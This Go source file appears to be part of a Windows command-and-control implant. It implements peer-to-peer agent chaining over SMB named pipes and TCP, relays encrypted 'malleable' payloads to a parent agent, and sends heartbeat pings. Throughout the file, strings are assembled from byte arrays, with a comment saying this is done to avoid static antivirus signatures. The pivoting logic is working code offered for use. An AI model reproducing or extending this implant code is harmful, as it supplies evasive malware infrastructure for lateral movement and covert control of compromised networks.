//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// Link manager strings (constructed to avoid static signatures)
var (
	lmKeyType       = string([]byte{0x74, 0x79, 0x70, 0x65})                                                                                                                                                                                       // type
	lmKeyPayload    = string([]byte{0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64})                                                                                                                                                                     // payload
	lmTypeData      = string([]byte{0x64, 0x61, 0x74, 0x61})                                                                                                                                                                                       // data
	lmTypeDisconn   = string([]byte{0x64, 0x69, 0x73, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74})                                                                                                                                                   // disconnect
	lmTypeHandshake = string([]byte{0x68, 0x61, 0x6e, 0x64, 0x73, 0x68, 0x61, 0x6b, 0x65})                                                                                                                                                         // handshake
	lmTypePing      = string([]byte{0x70, 0x69, 0x6e, 0x67})                                                                                                                                                                                       // ping
	lmTypePong      = string([]byte{0x70, 0x6f, 0x6e, 0x67})                                                                                                                                                                                       // pong
	lmStatusActive  = string([]byte{0x61, 0x63, 0x74, 0x69, 0x76, 0x65})                                                                                                                                                                           // active
	lmStatusInact   = string([]byte{0x69, 0x6e, 0x61, 0x63, 0x74, 0x69, 0x76, 0x65})                                                                                                                                                               // inactive
	lmAuthPrefix    = string([]byte{0x41, 0x55, 0x54, 0x48, 0x3a})                                                                                                                                                                                 // AUTH:
	lmAuthOK        = string([]byte{0x4f, 0x4b})                                                                                                                                                                                                   // OK
	lmFmtLinks      = string([]byte{0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x20, 0x4c, 0x69, 0x6e, 0x6b, 0x73, 0x20, 0x28, 0x25, 0x64, 0x29, 0x3a, 0x0a})                                                                                             // Active Links (%d):\n
	lmFmtLinkRow    = string([]byte{0x20, 0x20, 0x5b, 0x25, 0x73, 0x5d, 0x20, 0x25, 0x73, 0x20, 0x2d, 0x20, 0x25, 0x73, 0x20, 0x28, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x65, 0x64, 0x3a, 0x20, 0x25, 0x73, 0x2c, 0x20, 0x6c, 0x61, 0x73, 0x74, 0x20, 0x73, 0x65, 0x65, 0x6e, 0x3a, 0x20, 0x25, 0x73, 0x29, 0x0a}) //   [%s] %s - %s (connected: %s, last seen: %s)\n
	lmTimeFmt       = string([]byte{0x31, 0x35, 0x3a, 0x30, 0x34, 0x3a, 0x30, 0x35})                                                                                                                                                               // 15:04:05
)

// Heartbeat configuration
const (
	heartbeatInterval = 60 * time.Second  // Send ping every 60 seconds
	linkWriteTimeout  = 60 * time.Second  // Timeout for writing to linked agents
	linkReadTimeout   = 120 * time.Second // Timeout for reading from linked agents
)

// LinkedAgent represents a connected SMB or TCP agent (child link)
type LinkedAgent struct {
	RoutingID         string    // Short routing ID (assigned by this agent)
	PipePath          string    // Full pipe path for SMB (\\server\pipe\name)
	Address           string    // TCP address for TCP links (host:port)
	LinkType          string    // "smb" or "tcp"
	Conn              net.Conn  // Active connection (pipe or TCP)
	Connected         time.Time // When the link was established
	LastSeen          time.Time // Last successful communication
	IsActive          bool      // Whether the link is active
	AwaitingHandshake bool      // True after auth, false after first message (used for state-based routing)
	prependLen        int       // Track random prepend length for transform reversal
	appendLen         int       // Track random append length for transform reversal
	mu                sync.Mutex
}

// LinkManager manages connections to linked SMB and TCP agents (child links)
type LinkManager struct {
	mu             sync.RWMutex
	links          map[string]*LinkedAgent // routingID -> LinkedAgent
	pipeToRoute    map[string]string       // pipePath -> routingID (for SMB dedup)
	addressToRoute map[string]string       // address -> routingID (for TCP dedup)
	nextID         uint32                  // Atomic counter for generating routing IDs
	outboundData   chan *LinkDataOut       // Data received from linked agents, to be sent up the chain
	handshakeData  chan *LinkDataOut       // Handshake data from new linked agents (sent via "lh" field)

	// Response channels for synchronous command/response patterns
	responseChannels map[string]chan *LinkDataOut // routingID -> response channel
	responseMu       sync.RWMutex

	// Unlink notifications to be sent to server
	unlinkNotifications chan string // Routing IDs that have been unlinked
}

// LinkDataOut represents data from a linked agent to be forwarded up the chain
type LinkDataOut struct {
	RoutingID     string `json:"r"`            // Routing ID
	Payload       string `json:"p"`            // Base64 encoded, encrypted payload (or opaque transformed blob)
	PrependLength int    `json:"pl,omitempty"` // Random prepend length for transform reversal
	AppendLength  int    `json:"al,omitempty"` // Random append length for transform reversal
}

// LinkDataIn represents data from the server destined for a linked agent
type LinkDataIn struct {
	RoutingID string `json:"r"` // Routing ID
	Payload   string `json:"p"` // Base64 encoded payload
}

// ToMalleableMap converts LinkDataOut to a map using configurable field names
// This avoids hardcoded JSON struct tags when marshaling
func (ld *LinkDataOut) ToMalleableMap() map[string]interface{} {
	m := map[string]interface{}{
		MALLEABLE_ROUTING_ID_FIELD: ld.RoutingID,
		MALLEABLE_PAYLOAD_FIELD:    ld.Payload,
	}
	if ld.PrependLength > 0 {
		m["pl"] = ld.PrependLength
	}
	if ld.AppendLength > 0 {
		m["al"] = ld.AppendLength
	}
	return m
}

// ConvertLinkDataToMaps converts a slice of LinkDataOut to maps with malleable field names
func ConvertLinkDataToMaps(data []*LinkDataOut) []map[string]interface{} {
	if data == nil {
		return nil
	}
	result := make([]map[string]interface{}, len(data))
	for i, ld := range data {
		result[i] = ld.ToMalleableMap()
	}
	return result
}

var (
	smbLinkManager     *LinkManager
	smbLinkManagerOnce sync.Once
)

// GetLinkManager returns the singleton link manager
func GetLinkManager() *LinkManager {
	smbLinkManagerOnce.Do(func() {
		smbLinkManager = &LinkManager{
			links:               make(map[string]*LinkedAgent),
			pipeToRoute:         make(map[string]string),
			addressToRoute:      make(map[string]string),
			outboundData:        make(chan *LinkDataOut, 100),
			handshakeData:       make(chan *LinkDataOut, 10),
			responseChannels:    make(map[string]chan *LinkDataOut),
			unlinkNotifications: make(chan string, 100),
		}
		// Start the heartbeat goroutine to keep links alive
		smbLinkManager.StartHeartbeat()
	})
	return smbLinkManager
}

// GenerateRoutingID creates a short, unique routing ID
func (lm *LinkManager) GenerateRoutingID() string {
	id := atomic.AddUint32(&lm.nextID, 1)
	return fmt.Sprintf("%x", id)
}

// Link establishes a connection to another SMB agent via named pipe
func (lm *LinkManager) Link(pipePath string) (string, error) {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	// Check if already linked to this pipe
	if existingRoute, exists := lm.pipeToRoute[pipePath]; exists {
		if link, ok := lm.links[existingRoute]; ok && link.IsActive {
			return "", fmt.Errorf(Err(E5))
		}
	}

	// Connect to the named pipe
	conn, err := connectToPipe(pipePath)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	// Perform lightweight authentication with the SMB agent
	if err := performLinkAuth(conn); err != nil {
		conn.Close()
		return "", fmt.Errorf(ErrCtx(E3, err.Error()))
	}

	// Generate routing ID
	routingID := lm.GenerateRoutingID()

	// Create linked agent entry
	link := &LinkedAgent{
		RoutingID:         routingID,
		PipePath:          pipePath,
		LinkType:          "smb",
		Conn:              conn,
		Connected:         time.Now(),
		LastSeen:          time.Now(),
		IsActive:          true,
		AwaitingHandshake: true, // First message after auth is always handshake
	}

	// Store the link
	lm.links[routingID] = link
	lm.pipeToRoute[pipePath] = routingID

	// Start goroutine to handle incoming data from the SMB agent
	go lm.handleIncomingData(link)

	return routingID, nil
}

// LinkTCP establishes a connection to a TCP agent
func (lm *LinkManager) LinkTCP(address string) (string, error) {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	// Check if already linked to this address
	if existingRoute, exists := lm.addressToRoute[address]; exists {
		if link, ok := lm.links[existingRoute]; ok && link.IsActive {
			return "", fmt.Errorf(Err(E5))
		}
	}

	// Connect via TCP
	conn, err := dialTCP(address, 30*time.Second)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	// Perform HMAC-based authentication with the TCP agent
	if err := performLinkAuthTCP(conn); err != nil {
		conn.Close()
		return "", fmt.Errorf(ErrCtx(E3, err.Error()))
	}

	// Generate routing ID
	routingID := lm.GenerateRoutingID()

	// Create linked agent entry
	link := &LinkedAgent{
		RoutingID:         routingID,
		Address:           address,
		LinkType:          "tcp",
		Conn:              conn,
		Connected:         time.Now(),
		LastSeen:          time.Now(),
		IsActive:          true,
		AwaitingHandshake: true, // First message after auth is always handshake
	}

	// Store the link
	lm.links[routingID] = link
	lm.addressToRoute[address] = routingID

	// Start goroutine to handle incoming data from the TCP agent
	go lm.handleIncomingData(link)

	return routingID, nil
}

// Unlink disconnects from an SMB or TCP agent
func (lm *LinkManager) Unlink(routingID string) error {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	link, exists := lm.links[routingID]
	if !exists {
		return fmt.Errorf(Err(E4))
	}

	// Send graceful disconnect message
	if link.IsActive && link.Conn != nil {
		sendDisconnectMessage(link.Conn)
	}

	// Close the connection
	if link.Conn != nil {
		link.Conn.Close()
	}

	link.IsActive = false

	// Queue unlink notification to be sent up the chain
	select {
	case lm.unlinkNotifications <- routingID:
	default:
	}

	// Remove from maps based on link type
	if link.LinkType == "tcp" {
		delete(lm.addressToRoute, link.Address)
	} else {
		delete(lm.pipeToRoute, link.PipePath)
	}
	delete(lm.links, routingID)

	return nil
}

// GetLink returns a linked agent by routing ID
func (lm *LinkManager) GetLink(routingID string) (*LinkedAgent, bool) {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	link, exists := lm.links[routingID]
	if !exists || !link.IsActive {
		return nil, false
	}
	return link, true
}

// GetActiveLinks returns all active linked agents
func (lm *LinkManager) GetActiveLinks() []*LinkedAgent {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	var active []*LinkedAgent
	for _, link := range lm.links {
		if link.IsActive {
			active = append(active, link)
		}
	}
	return active
}

// ForwardToLinkedAgent sends data from parent to a linked (child) agent
func (lm *LinkManager) ForwardToLinkedAgent(routingID string, payload string, transformed bool) error {
	link, exists := lm.GetLink(routingID)
	if !exists {
		return fmt.Errorf(Err(E4))
	}

	link.mu.Lock()
	defer link.mu.Unlock()

	if link.Conn == nil || !link.IsActive {
		return fmt.Errorf(Err(E4))
	}

	var data []byte
	var err error

	if transformed {
		// Payload has transforms applied by server - decode and send raw bytes
		// The child agent will receive raw bytes, reverse transforms, parse JSON, decrypt
		data, err = base64.StdEncoding.DecodeString(payload)
		if err != nil {
			return fmt.Errorf(ErrCtx(E18, err.Error()))
		}
	} else {
		// Legacy mode - wrap payload in JSON envelope
		message := map[string]string{
			lmKeyType:    lmTypeData,
			lmKeyPayload: payload,
		}

		data, err = json.Marshal(message)
		if err != nil {
			return fmt.Errorf(ErrCtx(E18, err.Error()))
		}
	}

	// Write length-prefixed message with timeout
	link.Conn.SetWriteDeadline(time.Now().Add(linkWriteTimeout))
	if err := writeMessage(link.Conn, data); err != nil {
		link.Conn.SetWriteDeadline(time.Time{}) // Clear deadline
		link.IsActive = false
		return fmt.Errorf(ErrCtx(E11, err.Error()))
	}
	link.Conn.SetWriteDeadline(time.Time{}) // Clear deadline

	link.LastSeen = time.Now()
	return nil
}

// ForwardToLinkedAgentAndWait sends data to a linked agent and waits for a response
// Returns the response payload or error if timeout occurs
// If transformed=true, the payload is base64-encoded transformed data that should be sent as raw bytes
func (lm *LinkManager) ForwardToLinkedAgentAndWait(routingID string, payload string, transformed bool, timeout time.Duration) (*LinkDataOut, error) {
	// Create a response channel for this routing ID
	respChan := make(chan *LinkDataOut, 1)

	lm.responseMu.Lock()
	lm.responseChannels[routingID] = respChan
	lm.responseMu.Unlock()

	// Clean up when done
	defer func() {
		lm.responseMu.Lock()
		delete(lm.responseChannels, routingID)
		lm.responseMu.Unlock()
	}()

	// Forward the command
	if err := lm.ForwardToLinkedAgent(routingID, payload, transformed); err != nil {
		return nil, err
	}

	// Wait for response with timeout
	select {
	case response := <-respChan:
		return response, nil
	case <-time.After(timeout):
		return nil, nil // Timeout is not an error - response will come later via normal queue
	}
}

// WaitForLinkData waits for data from a specific routing ID with timeout
// Used after posting to server to wait for handshake response
func (lm *LinkManager) WaitForLinkData(routingID string, timeout time.Duration) (*LinkDataOut, error) {
	// Create a response channel for this routing ID
	respChan := make(chan *LinkDataOut, 1)

	lm.responseMu.Lock()
	lm.responseChannels[routingID] = respChan
	lm.responseMu.Unlock()

	// Clean up when done
	defer func() {
		lm.responseMu.Lock()
		delete(lm.responseChannels, routingID)
		lm.responseMu.Unlock()
	}()

	// Wait for response with timeout
	select {
	case response := <-respChan:
		return response, nil
	case <-time.After(timeout):
		return nil, fmt.Errorf(Err(E9))
	}
}

// GetOutboundData returns data that needs to be sent up the chain to parent
func (lm *LinkManager) GetOutboundData() []*LinkDataOut {
	var data []*LinkDataOut

	// Drain the channel (non-blocking)
	for {
		select {
		case item := <-lm.outboundData:
			data = append(data, item)
		default:
			return data
		}
	}
}

// GetHandshakeData returns handshake data from newly linked child agents (sent via "lh" field)
func (lm *LinkManager) GetHandshakeData() *LinkDataOut {
	select {
	case item := <-lm.handshakeData:
		return item
	default:
		return nil
	}
}

// queueHandshakeData is a helper to queue handshake data for delivery to parent
func (lm *LinkManager) queueHandshakeData(outbound *LinkDataOut) {
	select {
	case lm.handshakeData <- outbound:
	default:
	}
}

// GetUnlinkNotifications returns routing IDs that have been unlinked and need to be reported up the chain
func (lm *LinkManager) GetUnlinkNotifications() []string {
	var notifications []string

	// Drain the channel (non-blocking)
	for {
		select {
		case routingID := <-lm.unlinkNotifications:
			notifications = append(notifications, routingID)
		default:
			return notifications
		}
	}
}

// handleIncomingData reads data from a linked agent and queues it for the parent
// Supports both legacy JSON format and transformed/opaque data blobs
func (lm *LinkManager) handleIncomingData(link *LinkedAgent) {
	defer func() {
		log.Printf("[LINK] handleIncomingData exiting for routingID=%s", link.RoutingID)
		link.mu.Lock()
		link.IsActive = false
		link.mu.Unlock()
	}()

	for {
		// Read length-prefixed message from pipe/socket
		data, err := readMessage(link.Conn)
		if err != nil {
			log.Printf("[LINK] readMessage error for routingID=%s: %v", link.RoutingID, err)
			return
		}

		log.Printf("[LINK] Received %d bytes from routingID=%s", len(data), link.RoutingID)

		// Try to parse as legacy JSON format first
		var message map[string]string
		if err := json.Unmarshal(data, &message); err == nil && message[lmKeyType] != "" {
			// Successfully parsed as JSON with type field - legacy format
			msgType := message[lmKeyType]

			switch msgType {
			case lmTypeData:
				payloadLen := len(message[lmKeyPayload])
				log.Printf("[LINK] Data message from routingID=%s, payloadLen=%d", link.RoutingID, payloadLen)
				outbound := &LinkDataOut{
					RoutingID: link.RoutingID,
					Payload:   message[lmKeyPayload],
				}
				lm.deliverOutbound(link, outbound)

				// Clear handshake state after first data message
				link.mu.Lock()
				link.AwaitingHandshake = false
				link.mu.Unlock()

			case lmTypeHandshake:
				log.Printf("[LINK] Handshake message from routingID=%s", link.RoutingID)
				outbound := &LinkDataOut{
					RoutingID: link.RoutingID,
					Payload:   message[lmKeyPayload],
				}
				lm.queueHandshakeData(outbound)

				// Clear handshake state
				link.mu.Lock()
				link.AwaitingHandshake = false
				link.mu.Unlock()

			case lmTypePong:
				// Heartbeat response - just update LastSeen

			case lmTypeDisconn:
				log.Printf("[LINK] Disconnect message from routingID=%s", link.RoutingID)
				return
			}
		} else {
			// Not valid JSON or no type field - treat as raw transformed data
			// Child agent sent pre-transformed blob, base64 encode and forward as opaque
			link.mu.Lock()
			isHandshake := link.AwaitingHandshake
			prependLen := link.prependLen
			appendLen := link.appendLen
			link.AwaitingHandshake = false // First message consumed
			link.mu.Unlock()

			log.Printf("[LINK] Raw data from routingID=%s, len=%d, isHandshake=%v", link.RoutingID, len(data), isHandshake)

			// Base64 encode the raw transformed data for transport
			outbound := &LinkDataOut{
				RoutingID:     link.RoutingID,
				Payload:       base64.StdEncoding.EncodeToString(data),
				PrependLength: prependLen,
				AppendLength:  appendLen,
			}

			if isHandshake {
				// First message after auth = handshake
				lm.queueHandshakeData(outbound)
			} else {
				// Subsequent messages = data
				lm.deliverOutbound(link, outbound)
			}
		}

		link.mu.Lock()
		link.LastSeen = time.Now()
		link.mu.Unlock()
	}
}

// deliverOutbound delivers data to synchronous waiter or queues for async processing
func (lm *LinkManager) deliverOutbound(link *LinkedAgent, outbound *LinkDataOut) {
	// Check if someone is waiting synchronously for this response
	lm.responseMu.RLock()
	respChan, hasSyncWaiter := lm.responseChannels[link.RoutingID]
	lm.responseMu.RUnlock()

	log.Printf("[LINK] deliverOutbound: routingID=%s, hasSyncWaiter=%v, payloadLen=%d",
		link.RoutingID, hasSyncWaiter, len(outbound.Payload))

	if hasSyncWaiter {
		// Send to synchronous waiter (non-blocking)
		select {
		case respChan <- outbound:
			log.Printf("[LINK] Delivered to sync waiter for routingID=%s", link.RoutingID)
		default:
			// Channel full or closed, fall back to async queue
			log.Printf("[LINK] Sync waiter channel full, queueing for routingID=%s", link.RoutingID)
			lm.queueOutboundData(outbound)
		}
	} else {
		// No synchronous waiter, queue for normal async processing
		log.Printf("[LINK] No sync waiter, queueing for routingID=%s", link.RoutingID)
		lm.queueOutboundData(outbound)
	}
}

// queueOutboundData is a helper to queue data for async delivery to parent
func (lm *LinkManager) queueOutboundData(outbound *LinkDataOut) {
	select {
	case lm.outboundData <- outbound:
		log.Printf("[LINK] Queued outbound data for routingID=%s, payloadLen=%d", outbound.RoutingID, len(outbound.Payload))
	default:
		log.Printf("[LINK-WARN] outboundData channel full, DATA DROPPED for routingID=%s, payloadLen=%d", outbound.RoutingID, len(outbound.Payload))
	}
}

// ListLinks returns a summary of all linked agents
func (lm *LinkManager) ListLinks() string {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	if len(lm.links) == 0 {
		return Succ(S0)
	}

	result := fmt.Sprintf(lmFmtLinks, len(lm.links))
	for routingID, link := range lm.links {
		status := lmStatusActive
		if !link.IsActive {
			status = lmStatusInact
		}
		// Show PipePath for SMB links, Address for TCP links
		target := link.PipePath
		if link.LinkType == "tcp" {
			target = link.Address
		}
		result += fmt.Sprintf(lmFmtLinkRow,
			routingID, target, status,
			link.Connected.Format(lmTimeFmt),
			link.LastSeen.Format(lmTimeFmt))
	}
	return result
}

// Helper functions for pipe communication

func connectToPipe(pipePath string) (net.Conn, error) {
	// Use DialTimeout for Windows named pipes
	timeout := 30 * time.Second
	deadline := time.Now().Add(timeout)

	for time.Now().Before(deadline) {
		conn, err := dialPipe(pipePath)
		if err == nil {
			return conn, nil
		}
		time.Sleep(100 * time.Millisecond)
	}

	return nil, fmt.Errorf(Err(E9))
}

func performLinkAuth(conn net.Conn) error {
	// Lightweight authentication:
	// 1. Read challenge from SMB agent
	// 2. Sign with our key
	// 3. Send response

	// Set deadline for auth
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetDeadline(time.Time{}) // Clear deadline

	// Read challenge
	challenge, err := readMessage(conn)
	if err != nil {
		return fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	// Simple challenge-response for now
	// In production, use proper crypto
	response := append([]byte(lmAuthPrefix), challenge...)

	if err := writeMessage(conn, response); err != nil {
		return fmt.Errorf(ErrCtx(E11, err.Error()))
	}

	// Read confirmation
	confirm, err := readMessage(conn)
	if err != nil {
		return fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	if string(confirm) != lmAuthOK {
		return fmt.Errorf(Err(E3))
	}

	return nil
}

func sendDisconnectMessage(conn net.Conn) {
	message := map[string]string{lmKeyType: lmTypeDisconn}
	data, _ := json.Marshal(message)
	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	writeMessage(conn, data)
}

func writeMessage(conn net.Conn, data []byte) error {
	// Length-prefixed message: 4-byte length + data
	length := uint32(len(data))
	header := []byte{
		byte(length),
		byte(length >> 8),
		byte(length >> 16),
		byte(length >> 24),
	}

	if _, err := conn.Write(header); err != nil {
		return err
	}
	_, err := conn.Write(data)
	return err
}

func readMessage(conn net.Conn) ([]byte, error) {
	// Set read deadline to prevent indefinite blocking
	conn.SetReadDeadline(time.Now().Add(linkReadTimeout))
	defer conn.SetReadDeadline(time.Time{}) // Clear deadline when done

	// Read 4-byte length header
	header := make([]byte, 4)
	if _, err := conn.Read(header); err != nil {
		return nil, err
	}

	length := uint32(header[0]) | uint32(header[1])<<8 | uint32(header[2])<<16 | uint32(header[3])<<24

	// Sanity check
	if length > 10*1024*1024 { // 10MB max
		return nil, fmt.Errorf(Err(E2))
	}

	// Read data
	data := make([]byte, length)
	totalRead := 0
	for totalRead < int(length) {
		n, err := conn.Read(data[totalRead:])
		if err != nil {
			return nil, err
		}
		totalRead += n
	}

	return data, nil
}

// StartHeartbeat starts the heartbeat goroutine that pings all active links periodically
func (lm *LinkManager) StartHeartbeat() {
	go func() {
		ticker := time.NewTicker(heartbeatInterval)
		defer ticker.Stop()

		for range ticker.C {
			lm.pingAllLinks()
		}
	}()
}

// pingAllLinks sends ping messages to all active links to keep connections alive
func (lm *LinkManager) pingAllLinks() {
	lm.mu.RLock()
	activeLinks := make([]*LinkedAgent, 0, len(lm.links))
	for _, link := range lm.links {
		if link.IsActive {
			activeLinks = append(activeLinks, link)
		}
	}
	lm.mu.RUnlock()

	for _, link := range activeLinks {
		lm.sendPing(link)
	}
}

// sendPing sends a ping message to a linked agent
func (lm *LinkManager) sendPing(link *LinkedAgent) {
	link.mu.Lock()
	defer link.mu.Unlock()

	if link.Conn == nil || !link.IsActive {
		return
	}

	message := map[string]string{
		lmKeyType: lmTypePing,
	}

	data, err := json.Marshal(message)
	if err != nil {
		return
	}

	// Set a short write deadline for the ping
	link.Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if err := writeMessage(link.Conn, data); err != nil {
		// Mark link as inactive if ping fails
		link.IsActive = false
		return
	}
	link.Conn.SetWriteDeadline(time.Time{}) // Clear deadline
}
